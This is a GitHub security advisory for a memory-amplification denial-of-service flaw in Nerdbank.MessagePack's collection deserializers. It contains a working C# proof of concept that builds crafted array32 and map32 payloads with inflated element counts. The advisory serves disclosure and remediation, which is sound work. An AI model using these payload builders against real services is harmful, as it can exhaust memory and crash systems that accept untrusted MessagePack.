# [M] Nerdbank.MessagePack has a memory amplification DoS in collection deserialization

## Summary
Severity: Medium
Advisory: GHSA-qjvr-435c-5fjh
CWE: CWE-405
Ecosystem: NuGet
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-qjvr-435c-5fjh
Type: github-advisory

## Affected
- NuGet: `Nerdbank.MessagePack` — affected >=0 <1.1.78

## Details
Nerdbank.MessagePack deserializers for many collection-shaped types trusted the element count declared in MessagePack array and map headers when allocating destination storage. A crafted payload could therefore force large arrays, pooled buffers, dictionaries, or collection instances to be allocated before the deserializer had consumed the corresponding elements.

The same allocation pattern existed across strongly typed arrays, primitive arrays, mutable and immutable dictionaries, mutable enumerables, span-backed enumerable construction, `JsonNode`, `MessagePackValue`, and the object/dynamic primitive converters.

Because MessagePack array and map headers carry an attacker-controlled element count, any converter that immediately allocates `count` elements or constructs a collection with capacity `count` can turn a payload that is merely large into a much larger managed heap allocation. The reader's residency checks reduce the most extreme header-only attack shape, but they do not remove the memory amplification: minimal MessagePack elements can be one or two bytes on the wire while the managed representation may require object references, dictionary buckets, entries, array headers, or over-allocated collection internals.

## Vulnerability Pattern

Affected converters followed one or both of these patterns:

```csharp
int count = reader.ReadArrayHeader();
TElement[] array = new TElement[count];

int count = reader.ReadMapHeader();
Dictionary<TKey, TValue> map = new(count);
```

or, for streaming and span-backed construction:

```csharp
TElement[] elements = ArrayPool<TElement>.Shared.Rent(count);
TCollection collection = getCollection(state, count);
```

In all affected cases, the allocation size was derived from the untrusted header count before the converter had read the elements. This made deserialization vulnerable to memory amplification and process availability attacks.

## Affected Scope

The vulnerable logic was present in multiple converter families:

| Converter surface | Risk |
|-------------------|------|
| `ArrayConverter<TElement>` | Allocated `new TElement[count]` for typed arrays and rented large buffers in async paths. |
| `ArraysOfPrimitivesConverters` | Allocated or rented `TElement[count]` for primitive array and span-constructor paths. |
| `MutableEnumerableConverter<TEnumerable, TElement>` | Passed the untrusted count directly to collection construction. |
| `SpanEnumerableConverter<TEnumerable, TElement>` | Rented buffers sized to the declared element count. |
| `MutableDictionaryConverter<TDictionary, TKey, TValue>` | Passed the untrusted map count directly to dictionary construction. |
| `ImmutableDictionaryConverter<TDictionary, TKey, TValue>` | Rented `KeyValuePair<TKey, TValue>[count]` before reading entries. |
| `PrimitivesAsObjectConverter` and `PrimitivesAsDynamicConverter` | Allocated object arrays and dictionaries from attacker-controlled counts. |
| `JsonNodeConverter` | Allocated `JsonNode?[]` from the declared array length. |
| `MessagePackValueConverter` | Allocated arrays and dictionaries from declared array/map counts. |

This means the issue affects normal typed deserialization as well as object/dynamic APIs.
Any endpoint or protocol surface that accepts untrusted MessagePack and deserializes collection-shaped contracts can be affected.

## Attack Mechanics

MessagePack encodes array and map lengths up front. For `array32` and `map32`, the declared count can be very large. The reader checks that enough bytes remain to plausibly contain the declared number of elements, so an attacker must provide real payload bytes. However, the managed allocation can still be much larger than the payload.

Examples:

| Attack shape | Input cost | Managed allocation pressure |
|--------------|------------|-----------------------------|
| `array32` of `nil` values into `object?[]` | 1 byte per element | 8 bytes per reference on 64-bit runtimes, plus array overhead. |
| `map32` of small keys and `nil` values into `Dictionary<object, object?>` | 2 bytes per entry | Buckets, entries, key/value references, and dictionary overhead. |
| `array32` into typed reference arrays | 1 byte per `nil` element when element type allows null | 8 bytes per reference, plus array overhead. |
| `array32` into immutable dictionary staging buffers | 2+ bytes per entry | `KeyValuePair<TKey, TValue>[]` staging allocation before construction. |
| `map32` into typed dictionaries | 2+ bytes per entry for small keys/values | Dictionary capacity is allocated from the declared map count. |

At larger counts, the attack can trigger `OutOfMemoryException`, force full blocking garbage collections, or degrade service through repeated moderate allocations. The impact is availability loss rather than confidentiality or integrity compromise.

## Impact

An attacker who can deliver crafted MessagePack data to an endpoint that deserializes collections can:

- Crash the target process via `OutOfMemoryException` from a single large payload.
- Exhaust available memory through repeated moderate payloads.
- Induce severe GC pressure, increasing latency and reducing throughput.
- Affect typed DTO and framework integration paths, not only dynamic or untyped deserialization paths.

Concrete affected configurations include:

- ASP.NET Core, SignalR, RPC, queue, or storage endpoints that deserialize MessagePack request bodies or messages into DTOs with arrays, lists, sets, dictionaries, immutable dictionaries, `JsonNode`, `MessagePackValue`, `object`, or `dynamic` members.
- Code calling typed `Deserialize<T>()` where `T` contains collection-shaped members.
- Code calling `DeserializePrimitives()` or `DeserializeDynamicPrimitives()` on untrusted input.
- Applications registering `WithObjectConverter()` or `WithDynamicObjectConverter()` for framework integration or ad hoc object graphs.

## Severity Rationale

**Attack complexity is low.** Once an application accepts untrusted MessagePack for an affected collection type, exploitation only requires a crafted array or map payload with a large declared count and minimal encoded elements.

**Privileges required depend on deployment.** Public endpoints are exploitable without authentication. Internal or authenticated message-processing systems reduce exposure but remain vulnerable to any caller who can submit MessagePack data.

**User interaction is not required.** The attack is triggered during server-side or service-side deserialization.

**Availability impact is low.** The practical outcome is memory pressure which can slow down a process or machine, or cause a network request to fail.

## Proof of Concept

The following sample demonstrates the original object/dynamic shape and a typed array shape. Both rely on the same underlying bug: allocation is derived from the MessagePack header count before the elements are consumed.

```csharp
using System.Buffers;
using System.Buffers.Binary;
using Nerdbank.MessagePack;

Console.WriteLine("=== Memory Amplification DoS - Nerdbank.MessagePack ===");
Console.WriteLine();

var serializer = new MessagePackSerializer();

// 5-byte array32 header + 1 byte per nil element.
// Deserializing as object?[] allocates one managed reference per element.
const int ObjectArrayCount = 1_000_000;
byte[] objectArrayPayload = BuildArray32Payload(ObjectArrayCount, 0xC0);

Measure("object?[] array32 nil", objectArrayPayload, () =>
{
    var sequence = new ReadOnlySequence<byte>(objectArrayPayload);
    var reader = new MessagePackReader(sequence);
    return serializer.DeserializePrimitives(ref reader);
});

// 5-byte array32 header + 1 byte per integer element.
// A typed int[] target allocates four bytes per element plus array overhead.
const int IntArrayCount = 1_000_000;
byte[] intArrayPayload = BuildArray32Payload(IntArrayCount, 0x00);

Measure("int[] array32 fixint", intArrayPayload, () =>
{
    var sequence = new ReadOnlySequence<byte>(intArrayPayload);
    var reader = new MessagePackReader(sequence);
    return serializer.Deserialize<int[]>(ref reader);
});

// 5-byte map32 header + 2 bytes per entry: small fixint key, nil value.
// Duplicate keys are overwritten later, but the Dictionary capacity allocation fires first.
const int MapCount = 100_000;
byte[] mapPayload = BuildMap32Payload(MapCount);

Measure("object dictionary map32", mapPayload, () =>
{
    var sequence = new ReadOnlySequence<byte>(mapPayload);
    var reader = new MessagePackReader(sequence);
    return serializer.DeserializePrimitives(ref reader);
});

static void Measure(string name, byte[] payload, Func<object?> deserialize)
{
    GC.Collect();
    long before = GC.GetTotalMemory(true);

    try
    {
        object? result = deserialize();
        long after = GC.GetTotalMemory(false);
        long delta = after - before;
        Console.WriteLine($"[{name}] payload: {payload.Length / 1024.0:F1} KB");
        Console.WriteLine($"[{name}] memory delta: +{delta / 1024.0 / 1024.0:F1} MB");
        Console.WriteLine($"[{name}] amplification: {(double)delta / payload.Length:F1}x");
        GC.KeepAlive(result);
    }
    catch (OutOfMemoryException)
    {
        Console.WriteLine($"[{name}] OutOfMemoryException");
    }
    catch (MessagePackSerializationException ex)
    {
        Console.WriteLine($"[{name}] guarded: {ex.Message}");
    }

    Console.WriteLine();
}

static byte[] BuildArray32Payload(int count, byte element)
{
    byte[] payload = new byte[5 + count];
    payload[0] = 0xDD;
    BinaryPrimitives.WriteInt32BigEndian(payload.AsSpan(1), count);
    payload.AsSpan(5).Fill(element);
    return payload;
}

static byte[] BuildMap32Payload(int count)
{
    byte[] payload = new byte[5 + count * 2];
    payload[0] = 0xDF;
    BinaryPrimitives.WriteInt32BigEndian(payload.AsSpan(1), count);

    for (int i = 0; i < count; i++)
    {
        payload[5 + i * 2] = (byte)(i % 128);
        payload[5 + i * 2 + 1] = 0xC0;
    }

    return payload;
}
```

Confirmed output against the vulnerable implementation included object-array amplification around 8x and dictionary amplification above 20x for moderate payload sizes. Typed collection amplification varies by element type and target collection implementation, but the same attacker-controlled preallocation primitive is present.

## Remediation

The deserializer honors input data's prefixed collection sizes up to a reasonable limit, after which the collections grow when the data is actually encountered, such that memory amplification is limited to only small amounts over the size of the data being deserialized.

## Prior Art

**CVE-2026-21452 / [GHSA-cw39-r4h6-8j3x](https://github.com/advisories/GHSA-cw39-r4h6-8j3x)**: MessagePack for Java. An EXT32 object with an attacker-controlled payload length caused `ExtensionValue.getData()` to allocate a byte array of that size with no upper bound. This is the same vulnerability class: header-declared size leading to attacker-controlled heap allocation. It was fixed in `msgpack-java` 0.9.11 by avoiding unbounded allocation.

**CVE-2024-48924 / [GHSA-4qm4-8hg2-g2xm](https://github.com/advisories/GHSA-4qm4-8hg2-g2xm)**: MessagePack-CSharp. Untrusted data could trigger denial of service during deserialization through a different mechanism. It demonstrates the same ecosystem-level risk: MessagePack deserializers are frequently reachable on network and message-processing boundaries, where availability defects are exploitable.

## References
- https://github.com/AArnott/Nerdbank.MessagePack/security/advisories/GHSA-qjvr-435c-5fjh
- https://github.com/AArnott/Nerdbank.MessagePack/commit/6f19387a3d1322aea880ce3f8db2cfd0de195e12
- https://github.com/AArnott/Nerdbank.MessagePack
